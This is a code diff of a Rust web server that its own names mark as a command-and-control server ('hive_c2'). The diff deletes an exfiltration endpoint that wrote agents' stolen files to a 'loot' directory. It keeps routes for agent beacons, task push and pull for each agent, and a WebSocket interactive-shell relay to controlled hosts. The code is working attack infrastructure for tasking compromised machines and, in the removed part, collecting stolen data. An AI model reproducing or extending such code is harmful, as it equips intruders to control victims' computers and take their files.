@@ -9,14 +9,13 @@ use std::sync::{Arc, Mutex as StdMutex};
 use std::time::{Duration, Instant};
 
 use axum::{
-    extract::{ConnectInfo, Path, Query, State, WebSocketUpgrade},
+    extract::{ConnectInfo, Path, State, WebSocketUpgrade},
     http::{HeaderName, HeaderValue, StatusCode},
     middleware,
     response::{Html, IntoResponse, Json},
     routing::{get, post},
     Router,
 };
-use base64::Engine;
 use clap::Parser;
 use serde::{Deserialize, Serialize};
 use tokio::sync::Mutex;
@@ -33,9 +32,6 @@ struct Args {
 
     #[arg(long, default_value = "0.0.0.0")]
     host: String,
-
-    #[arg(long, default_value = "./loot")]
-    loot_dir: PathBuf,
 
     #[arg(long, default_value = "hive_c2.db")]
     db_path: PathBuf,
@@ -67,7 +63,6 @@ struct AppState {
     db: Arc<Mutex<Db>>,
     sessions: Arc<Mutex<SessionManager>>,
     relay: shell::RelayMap,
-    loot_dir: PathBuf,
     /// When non-empty, agent/operator endpoints require the `x-api-key`
     /// header to match this value (constant-time comparison).
     api_key: String,
@@ -128,7 +123,6 @@ impl RateLimiter {
 #[derive(Serialize)]
 struct HealthResponse {
     status: &'static str,
-    exfil_count: usize,
     beacon_count: usize,
     sessions: usize,
 }
@@ -163,19 +157,6 @@ struct TaskResponse {
     tasks: Vec<Task>,
 }
 
-#[derive(Deserialize)]
-struct CollectQuery {
-    #[serde(default)]
-    filename: String,
-}
-
-#[derive(Serialize)]
-struct CollectResponse {
-    status: &'static str,
-    sha256: String,
-    size: usize,
-}
-
 #[derive(Serialize)]
 struct LogEntry {
     timestamp: String,
@@ -193,15 +174,12 @@ async fn main() {
 
     let args = Args::parse();
 
-    std::fs::create_dir_all(&args.loot_dir).expect("Failed to create loot directory");
-
     let db = Db::open(&args.db_path).expect("Failed to open database");
     let sessions = SessionManager::new();
     let state = AppState {
         db: Arc::new(Mutex::new(db)),
         sessions: Arc::new(Mutex::new(sessions)),
         relay: Arc::new(Mutex::new(HashMap::new())),
-        loot_dir: args.loot_dir,
         api_key: args.api_key,
         rate: Arc::new(RateLimiter::new(args.rate_limit)),
     };
@@ -254,7 +232,6 @@ async fn main() {
     // Layer order (outermost first = added last): CORS → rate limit → auth.
     let protected_base = Router::new()
         .route("/logs", get(logs_handler))
-        .route("/collect", post(collect_handler))
         .route("/beacon", post(beacon_handler))
         .route("/task/:agent_id", get(task_handler))
         .route("/task/:agent_id", post(task_push_handler))
@@ -291,8 +268,7 @@ async fn main() {
     } else {
         tracing::info!("Rate limiting ENABLED — {} req/min per client IP", args.rate_limit);
     }
-    tracing::info!("  POST /collect   - Receive exfiltrated data");
-    tracing::info!("  POST /beacon    - Agent heartbeats");
+    tracing::info!("  POST /beacon    - Agent heartbeats + task results");
     tracing::info!("  GET  /task/:id  - Task pull");
     tracing::info!("  GET  /shell/:id - WebSocket interactive shell");
     tracing::info!("  GET  /health    - Health check");
@@ -371,15 +347,14 @@ fn api_key_matches(expected: &str, provided: Option<&str>) -> bool {
 }
 
 async fn health_handler(State(state): State<AppState>) -> Json<HealthResponse> {
-    let (exfil_count, beacon_count) = {
+    let beacon_count = {
         let db = state.db.lock().await;
-        db.counts()
+        db.beacon_count()
     };
     let session_count = state.sessions.lock().await.list().len();
 
     Json(HealthResponse {
         status: "ok",
-        exfil_count,
         beacon_count,
         sessions: session_count,
     })
@@ -409,73 +384,6 @@ h1{color:#73d0a0}a{color:#5ccfe6}
 async fn logs_handler(State(state): State<AppState>) -> Json<Vec<LogEntry>> {
     let db = state.db.lock().await;
     Json(db.recent_activity(50))
-}
-
-async fn collect_handler(
-    State(state): State<AppState>,
-    Query(query): Query<CollectQuery>,
-    headers: axum::http::HeaderMap,
-    body: axum::body::Bytes,
-) -> Result<Json<CollectResponse>, StatusCode> {
-    let agent_id = headers
-        .get("x-agent-id")
-        .and_then(|v| v.to_str().ok())
-        .unwrap_or("unknown");
-    let agent_role = headers
-        .get("x-agent-role")
-        .and_then(|v| v.to_str().ok())
-        .unwrap_or("unknown");
-
-    let filename = if query.filename.is_empty() {
-        headers
-            .get("x-file-name")
-            .and_then(|v| v.to_str().ok())
-            .unwrap_or("data.bin")
-            .to_string()
-    } else {
-        query.filename
-    };
-
-    let raw: Vec<u8> = if headers
-        .get("content-transfer-encoding")
-        .and_then(|v| v.to_str().ok())
-        == Some("base64")
-    {
-        base64::engine::general_purpose::STANDARD
-            .decode(&body)
-            .unwrap_or_else(|_| body.to_vec())
-    } else {
-        body.to_vec()
-    };
-
-    let hash = {
-        use sha2::Digest;
-        let mut h = sha2::Sha256::new();
-        h.update(&raw);
-        hex::encode(h.finalize())
-    };
-    let size = raw.len();
-
-    let safe_name = filename.replace(['/', '\\'], "_");
-    let ts = chrono::Utc::now().format("%Y%m%d_%H%M%S");
-    let filepath = state.loot_dir.join(format!("{ts}_{safe_name}"));
-
-    tokio::fs::write(&filepath, &raw)
-        .await
-        .map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
-
-    {
-        let db = state.db.lock().await;
-        db.record_exfil(agent_id, agent_role, &filename, size, &hash, &filepath);
-    }
-
-    tracing::info!(agent = %agent_id, role = %agent_role, file = %filename, size = %size, "Exfil received");
-
-    Ok(Json(CollectResponse {
-        status: "received",
-        sha256: hash,
-        size,
-    }))
 }
 
 async fn beacon_handler(
@@ -536,7 +444,7 @@ async fn beacon_handler(
 
     let beacon_count = {
         let db = state.db.lock().await;
-        db.counts().1
+        db.beacon_count()
     };
     Json(serde_json::json!({
         "status": "ack",
